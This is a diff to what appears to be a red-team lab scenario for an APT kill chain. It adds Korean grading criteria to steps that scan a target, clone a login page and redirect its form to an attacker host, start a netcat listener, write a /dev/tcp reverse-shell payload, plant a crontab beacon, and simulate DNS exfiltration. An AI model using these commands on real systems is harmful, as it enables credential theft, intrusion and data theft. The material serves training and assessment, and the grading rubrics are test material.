@@ -61,6 +61,21 @@ steps:
     type: output_contains
     expect: open
     field: stdout
+    semantic:
+      intent: nmap -sV -O -sC 조합으로 대상 호스트의 서비스 버전·OS·기본 NSE 스크립트 결과를 수집하여 공격 표면 정의
+      success_criteria:
+      - nmap 출력에 포트/서비스/버전 매핑(예 80/tcp open http nginx 1.18.0) 포함
+      - OS fingerprinting 추정(Linux 커널 버전, Windows 등) 또는 CPE 정보 제시
+      - 기본 NSE 스크립트 결과(SSL 인증서·HTTP 제목·robots.txt 등) 최소 1개 출력
+      acceptable_methods:
+      - nmap -sV -O -sC <target>
+      - nmap --script default,version <target>
+      - 배너 그래빙 조합 (nc -vn <target> 80 후 HEAD /)
+      - whatweb/wappalyzer 같은 기술 스택 탐지기
+      negative_signs:
+      - 포트 상태만 나열하고 버전 탐지 없음
+      - OS 정보 전혀 없음 (-O 적용되지 않음)
+      - 스캔 실패 메시지만 출력되고 버전/OS 정보 없음
   target_vm: attacker
   script: nmap -sV -O -sC --max-retries 1 --host-timeout 15s -T4 10.20.30.80
   risk_level: low
@@ -79,6 +94,21 @@ steps:
     type: output_contains
     expect: vuln
     field: stdout
+    semantic:
+      intent: nmap NSE vuln 카테고리로 HTTP 서비스의 알려진 CVE/취약점 자동 탐지 수행
+      success_criteria:
+      - 'nmap --script vuln 실행 결과 출력 (발견 시 VULNERABLE: 마커, 미발견 시 ERROR 포함 허용)'
+      - 최소 1개 스크립트 이름(http-vuln-*, ssl-heartbleed, http-shellshock 등) 언급
+      - 스캔 대상 포트/경로 명시
+      acceptable_methods:
+      - nmap --script vuln -p <ports> <target>
+      - nmap --script http-vuln-cve* -p 80,3000 <target>
+      - nikto -h <target>:<port> 로 대체 취약점 스캔
+      - wapiti/arachni 같은 웹 취약점 스캐너
+      negative_signs:
+      - vuln 스크립트 아닌 default 스크립트만 실행
+      - 스캔 대상 누락 또는 포트 지정 없음
+      - 실행 타임아웃만 출력되고 취약점 탐색 언급 없음
   target_vm: attacker
   script: nmap --script vuln -p 80,3000 --max-retries 1 --host-timeout 15s -T4 10.20.30.80
   risk_level: low
@@ -99,6 +129,21 @@ steps:
     type: output_contains
     expect: phish_template.html
     field: stdout
+    semantic:
+      intent: 피싱 무기화를 위한 템플릿 준비 — 대상 로그인 페이지 HTML 을 curl -o 로 저장하고 검증
+      success_criteria:
+      - curl -o /tmp/phish_template.html (또는 유사 경로) 로 저장
+      - 저장된 파일 검증 (ls -la 또는 wc -l) 으로 다운로드 성공 확인
+      - APT 무기화 단계와 스피어피싱 목적 맥락 언급
+      acceptable_methods:
+      - curl -s -o <file> <url>
+      - wget -O <file> <url>
+      - python requests.get(url).text 후 파일 쓰기
+      - httrack/scrapy 로 전체 페이지 복제
+      negative_signs:
+      - 파일 저장 없이 화면 출력만 (-o 생략)
+      - 전혀 다른 URL 저장 (대상 서버 무관)
+      - 다운로드 실패만 받고 재시도/대체 시도 없음
   target_vm: attacker
   script: curl -s -o /tmp/phish_template.html http://10.20.30.80:3000/ && ls -la /tmp/phish_template.html
     && echo "phish_template.html downloaded"
@@ -121,6 +166,21 @@ steps:
     type: output_contains
     expect: 10.20.30.201:4444
     field: stdout
+    semantic:
+      intent: 피싱 템플릿의 form action URL 을 공격자 서버(<ATTACKER_IP>:4444)로 인라인 변조 — 자격증명 탈취 경로 구성
+      success_criteria:
+      - sed -i 또는 동등 in-place 편집으로 action 속성 URL 을 공격자 IP·포트로 교체
+      - 변조 후 grep 등으로 새 URL 이 파일에 들어간 것 확인
+      - 피싱 자격증명 탈취 흐름 설명 (피해자 폼 제출 시 공격자 서버로 전송)
+      acceptable_methods:
+      - sed -i s|action=...|action=http://<atk>:4444/capture|g <file>
+      - python -c <regex replace script>
+      - perl -i -pe s/.../.../g <file>
+      - 에디터로 수동 변경 후 저장
+      negative_signs:
+      - 파일 변경 없이 새 HTML 작성만
+      - 공격자 IP:포트 정보 누락
+      - 변경 후 검증(grep) 단계 생략
   target_vm: attacker
   script: sed -i 's|action="[^"]*"|action="http://10.20.30.201:4444/capture"|g' /tmp/phish_template.html
     2>/dev/null; grep -o 'action="[^"]*"' /tmp/phish_template.html | head -3 || echo "No form action found
@@ -144,6 +204,21 @@ steps:
     type: output_contains
     expect: listening
     field: stdout
+    semantic:
+      intent: 공격자 VM 에서 netcat 리스너(포트 4444) 를 백그라운드로 띄워 리버스 셸 수신 C2 준비
+      success_criteria:
+      - nc -lvnp 4444 (또는 동등 리스너) 실행 표시
+      - 리스너 동작 확인 — ss/netstat/ss -tlnp 로 4444 포트 리스닝 상태
+      - C2 채널 목적·리버스 셸 원리 언급
+      acceptable_methods:
+      - nc -lvnp 4444 & 로 백그라운드 리스너
+      - ncat -lvnp 4444 (ssl/verbose 지원)
+      - socat TCP-LISTEN:4444,reuseaddr,fork - 로 대체
+      - <SENSITIVE:f5ccdc27f8af6cf2>
+      negative_signs:
+      - 리스너 없이 연결만 시도
+      - 포트가 4444 아님 또는 -l(listen) 플래그 누락
+      - 리스너 기동 후 검증 없음
   target_vm: attacker
   script: nc -lvnp 4444 &>/tmp/nc_listener.log & sleep 1 && echo "netcat listening on port 4444" && ss
     -tlnp | grep 4444
@@ -165,6 +240,21 @@ steps:
     type: output_contains
     expect: payload.elf
     field: stdout
+    semantic:
+      intent: Linux 타겟에서 실행할 bash 리버스 셸 페이로드 스크립트 작성 (LHOST/LPORT 파라미터화) — 무기화 단계 드로퍼 제작 원리 학습
+      success_criteria:
+      - <SENSITIVE:1640803f56dfc4cb>
+      - 파일 저장 후 실행 권한 부여(chmod +x) 및 file/strings 로 검증
+      - msfvenom 과 수동 방식 차이 설명
+      acceptable_methods:
+      - printf 로 shebang 포함 스크립트 작성 후 chmod +x
+      - msfvenom -p linux/x64/shell_reverse_tcp LHOST=.. LPORT=.. -f elf
+      - python3 -c 스크립트로 socket+pty 리버스 셸
+      - ncat --ssl 기반 암호화 리버스 셸
+      negative_signs:
+      - LHOST/LPORT 플레이스홀더 미치환
+      - 스크립트 파일 없이 화면 출력만
+      - 페이로드의 공격 목적 언급 없음
   target_vm: attacker
   script: printf "#!/bin/bash\n# Reverse Shell Payload (simulation)\n# LHOST=10.20.30.201 LPORT=4444\n#
     bash -i >& /dev/tcp/10.20.30.201/4444 0>&1\necho \"payload executed (simulation)\"\n" > /tmp/payload.elf
@@ -187,6 +277,21 @@ steps:
     type: output_contains
     expect: /bin/bash
     field: stdout
+    semantic:
+      intent: 제작한 페이로드의 SHA256 해시를 IoC 로 기록하고 strings/file 로 정적 분석해 AV 시그니처 노출 여부 점검
+      success_criteria:
+      - sha256sum 으로 payload 해시값 출력
+      - strings 로 /bin/bash, /dev/tcp 등 시그니처 문자열 추출
+      - file 명령으로 파일 유형(ASCII/ELF 등) 확인 및 탐지 회피 관점 설명
+      acceptable_methods:
+      - sha256sum + strings + file 조합
+      - yara 규칙으로 시그니처 매칭
+      - virustotal API 또는 hashlookup 서비스 조회
+      - floss(FireEye Labs Obfuscated Strings Solver) 로 난독화 문자열 추출
+      negative_signs:
+      - 해시 계산 없이 strings 만 실행
+      - 전혀 다른 파일 대상 분석
+      - 페이로드가 없다는 이유로 분석 생략
   target_vm: attacker
   script: sha256sum /tmp/payload.elf && echo "--- Strings analysis ---" && strings /tmp/payload.elf &&
     echo "--- File type ---" && file /tmp/payload.elf
@@ -209,6 +314,21 @@ steps:
     type: output_contains
     expect: beacon
     field: stdout
+    semantic:
+      intent: MITRE ATT&CK T1053.003 — crontab 에 주기적 비콘 항목 추가해 Persistence 시뮬레이션 (실제 통신은 없음)
+      success_criteria:
+      - crontab -l 과 echo 조합으로 새 엔트리를 비대화형 추가
+      - 추가된 엔트리가 crontab -l | grep 으로 확인됨
+      - T1053.003 또는 ATT&CK Persistence 언급
+      acceptable_methods:
+      - (crontab -l; echo <line>) | crontab -
+      - /etc/cron.d/<name> 파일 직접 생성
+      - systemd timer 작성 (T1053.006 대체)
+      - at 명령으로 일회성 Persistence
+      negative_signs:
+      - crontab 변경 없이 한 번만 실행
+      - 비콘 주소 누락
+      - crontab 확인 단계 생략
   target_vm: attacker
   script: (crontab -l 2>/dev/null; echo '*/5 * * * * curl -s http://10.20.30.201:4444/beacon') | crontab
     - && crontab -l | grep beacon
@@ -229,6 +349,21 @@ steps:
     type: output_contains
     expect: beacon
     field: stdout
+    semantic:
+      intent: 방어자 관점 — crontab -l 로 Persistence 확인 + /var/log/syslog 에서 cron 로그 이상 패턴 검색
+      success_criteria:
+      - crontab -l 출력에 비콘 엔트리 표시
+      - syslog (또는 journalctl) 에서 CRON 관련 이벤트 추출
+      - auditd/SIEM 를 통한 탐지 가능성 설명
+      acceptable_methods:
+      - crontab -l + grep cron /var/log/syslog
+      - journalctl -u cron --since -1h
+      - auditctl -w /var/spool/cron -p war 로 감시 설정 예시
+      - Wazuh/Splunk query 로 cron 변경 이벤트 상관
+      negative_signs:
+      - 공격 시점(s9) 비콘 언급 없이 일반 cron 점검만
+      - 로그 검색 결과 해석 없이 출력만 나열
+      - 방어자 관점/탐지 기법 언급 없음
   target_vm: attacker
   script: crontab -l && grep -i cron /var/log/syslog | tail -20
   risk_level: low
@@ -249,6 +384,21 @@ steps:
     type: output_contains
     expect: whoami
     field: stdout
+    semantic:
+      intent: 파일리스(Fileless) 기법 — 환경변수에 Base64 인코딩된 명령 저장 후 디코딩·실행으로 AV 회피 시뮬레이션
+      success_criteria:
+      - export VAR=$(echo <cmd> | base64) 로 환경변수에 인코딩 저장
+      - echo $VAR | base64 -d 로 디코딩 후 실행 또는 출력
+      - T1027(Obfuscated Files) 또는 T1059.004 Unix Shell 관련 언급
+      acceptable_methods:
+      - bash export + base64 -d 파이프
+      - python -c import os,base64; exec(base64.b64decode(os.environ["X"]))
+      - eval $(echo $VAR | base64 -d) 로 즉시 실행
+      - memfd_create + fexecve 로 메모리 실행
+      negative_signs:
+      - Base64 인코딩 없이 평문 저장
+      - 환경변수 사용 없이 파일에만 저장 (파일리스 아님)
+      - 디코딩/실행 단계 생략
   target_vm: attacker
   script: export PAYLOAD=$(echo 'whoami && id && hostname' | base64) && echo $PAYLOAD | base64 -d
   risk_level: medium
@@ -267,6 +417,21 @@ steps:
     type: output_contains
     expect: saved
     field: stdout
+    semantic:
+      intent: 대상 웹서버의 페이지·JS·API 엔드포인트 구조를 오프라인 분석하기 위해 재귀 미러링
+      success_criteria:
+      - wget -r -l 2 또는 --mirror 로 깊이 제한 재귀 다운로드
+      - 결과물이 /tmp/mirror (또는 유사 디렉터리) 에 저장됨을 확인
+      - APT 정찰 단계에서 웹 구조·숨겨진 경로·JS 내 API 분석 맥락 언급
+      acceptable_methods:
+      - wget -r -l N -P <dir> <url>
+      - httrack 로 전체 사이트 복제
+      - curl + find + grep 조합으로 링크 추출 후 반복 다운로드
+      - Burp Site Map 저장 및 내보내기
+      negative_signs:
+      - 단일 페이지만 다운로드 (재귀 아님)
+      - 깊이 제한 없이 무제한 크롤 (-l 누락) 로 DoS 위험
+      - 다운로드 없이 단순 curl 로 루트만 조회
   target_vm: attacker
   script: wget -r -l 2 -P /tmp/mirror http://10.20.30.80:3000/ 2>&1 | tail -5
   risk_level: low
@@ -288,6 +453,21 @@ steps:
     type: output_contains
     expect: exfil
     field: stdout
+    semantic:
+      intent: 킬체인 Actions on Objectives — 시스템 정보 수집 후 Base64 청크로 DNS 서브도메인 형태 유출 시뮬레이션 (T1048.003)
+      success_criteria:
+      - hostname/uname/ip 등 시스템 정보를 파일에 수집
+      - base64 -w 63 (또는 유사) 로 청크 분할해 DNS 서브도메인 길이 제약 준수
+      - T1005(로컬 수집) + T1048.003(DNS Exfil) 또는 OOB 유출 원리 설명
+      acceptable_methods:
+      - cat /etc/hostname >> exfil_data.txt; uname -a >> ...; ip addr >> ...
+      - dnscat2 또는 iodine 으로 실제 DNS 터널 (실습환경)
+      - python socket.gethostbyname 로 서브도메인 쿼리
+      - dig +short <payload>.<attacker_domain>
+      negative_signs:
+      - 수집만 하고 인코딩/유출 시뮬 없음
+      - 청크 분할 없이 단일 base64 출력 (DNS 255자 제약 무시)
+      - 유출 개념(OOB) 언급 없음
   target_vm: attacker
   script: cat /etc/hostname > /tmp/exfil_data.txt && uname -a >> /tmp/exfil_data.txt && ip addr >> /tmp/exfil_data.txt
     && echo '=== Collected data ===' && wc -l /tmp/exfil_data.txt && echo '=== DNS exfil simulation (base64
@@ -314,6 +494,23 @@ steps:
     type: output_contains
     expect: Kill Chain Report
     field: stdout
+    semantic:
+      intent: 레드팀 Cleanup — crontab 비콘/임시파일 제거 + 킬체인 7단계별 사용 기법을 MITRE ATT&CK ID 로 매핑해 /tmp/killchain_report.txt
+        작성
+      success_criteria:
+      - crontab -l | grep -v beacon | crontab - 로 비콘 엔트리 제거
+      - rm -f 로 임시 페이로드/수집 파일 삭제
+      - 리포트에 킬체인 7단계(Recon/Weaponization/Delivery/Exploitation/Installation/C2/Actions) 와 대응 ATT&CK ID(T1595/T1587/T1566/T1059/T1053.003/T1071/T1048.003
+        등) 최소 5개 포함
+      acceptable_methods:
+      - sed 또는 grep -v 로 crontab 편집 후 재설치
+      - find -delete 또는 rm -f 로 임시파일 정리
+      - echo -e 로 다줄 리포트 작성 또는 heredoc 사용
+      - markdown 또는 JSON 형식 리포트 수락
+      negative_signs:
+      - Persistence 제거 단계 생략
+      - 리포트에 ATT&CK ID 없음 또는 킬체인 단계 3개 미만
+      - 임시파일 정리 없음
   target_vm: attacker
   script: 'crontab -l | grep -v beacon | crontab - && rm -f /tmp/payload.elf /tmp/exfil_data.txt && echo
     -e ''=== APT Kill Chain Report ===\n1. Recon: nmap stealth scan (T1595)\n2. Weaponization: reverse
